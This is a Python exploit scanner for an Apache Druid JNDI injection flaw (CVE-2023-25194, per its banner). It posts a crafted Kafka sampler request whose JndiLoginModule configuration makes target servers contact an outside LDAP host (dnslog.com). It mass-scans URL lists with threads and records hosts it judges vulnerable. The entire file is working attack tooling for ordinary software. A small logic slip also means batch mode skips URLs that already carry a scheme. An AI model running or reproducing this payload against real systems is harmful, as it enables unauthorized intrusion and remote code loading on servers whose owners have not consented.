import requests
import json
import concurrent.futures,argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    banner='''
   _______    ________    ___   ____ ___  _____      ___   _____________  __ __
  / ____/ |  / / ____/   |__ \ / __ \__ \|__  /     |__ \ / ____<  / __ \/ // /
 / /    | | / / __/________/ // / / /_/ / /_ <________/ //___ \ / / /_/ / // /_
/ /___  | |/ / /__/_____/ __// /_/ / __/___/ /_____/ __/____/ // /\__, /__  __/
\____/  |___/_____/    /____/\____/____/____/     /____/_____//_//____/  /_/   
                                                                               
                                                    PowerBy:YongYe__Security
    '''
    print(banner)
def send_requests(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    data = {
    "type":"kafka",
    "spec":{
        "type":"kafka",
        "ioConfig":{
            "type":"kafka",
            "consumerProperties":{
                "bootstrap.servers":"127.0.0.1:6666",
                "sasl.mechanism":"SCRAM-SHA-256",
                "security.protocol":"SASL_SSL",
                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://dnslog.com\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
            },
            "topic":"test",
            "useEarliestOffset":True,
            "inputFormat":{
                "type":"regex",
                "pattern":"([\\s\\S]*)",
                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns":[
                    "raw"
                ]
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"!!!_no_such_column_!!!",
                "missingValue":"1970-01-01T00:00:00Z"
            },
            "dimensionsSpec":{

            },
            "granularitySpec":{
                "rollup":False
            }
        },
        "tuningConfig":{
            "type":"kafka"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}

    try:
        response = requests.post(url + "/druid/indexer/v1/sampler?for=connect", headers=headers, json=data, timeout=3, verify=False)
        response_code = response.status_code
        response_content = response.json()
        error_text = response_content.get("error", {})
        if error_text != "Unable to create RecordSupplier: User not found":
            print(f"[-] URL:{url}\t"+ f"Code:{response_code}" + "\tNot vulnerable!")
        else:
            with open('result.txt', "a") as file:
                file.write(f"{url}\n")
            print(f"[*] URL:{url}\t"+ f"Code:{response_code}" + "\tVulnerable to attacks!")
    except Exception as e:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description="Send POST requests to URLs")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL, Single target detection")
    group.add_argument("-f", "--file", help="URL File, Batch scan")
    args = parser.parse_args()
    if args.url:
        url = args.url
        send_requests(url)
    else:
        url_file = args.file
        
        with open(url_file, "r") as file:
            urls = file.readlines()
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                for url in urls:
                    url = url.strip()
                    if not url.startswith(("https://", "http://")):
                        url = "http://" + url
                        executor.submit(send_requests, url)
main()